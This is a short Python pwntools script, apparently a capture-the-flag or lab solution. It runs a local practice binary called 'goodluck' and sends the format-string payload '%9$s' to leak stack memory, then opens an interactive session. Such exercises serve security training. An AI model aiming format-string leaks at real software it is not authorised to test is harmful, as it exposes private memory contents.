from pwn import *

sh = process(['/mnt/hgfs/Cyber Security PWN/test/fmtstr2/goodluck'])
payload = "%9$s"
sh.sendline(payload)
sh.interactive()
